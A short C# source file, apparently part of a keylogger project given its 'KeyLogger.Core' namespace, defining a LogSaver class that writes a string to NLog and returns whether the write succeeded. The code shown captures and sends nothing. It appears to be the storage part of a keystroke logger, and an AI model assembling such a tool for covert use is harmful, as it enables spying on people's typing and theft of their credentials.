using System;
using KeyLogger.Core.Abstract;
using NLog;

namespace KeyLogger.Core
{
    public class LogSaver: ILogSaver
    {
        private static readonly Logger NLogger = LogManager.GetCurrentClassLogger();

        public bool Save(string log)
        {
            try
            {
                NLogger.Log(LogLevel.Info, log);
            }
            catch (Exception)
            {
                return false;
            }
            return true;
        }
    }
}
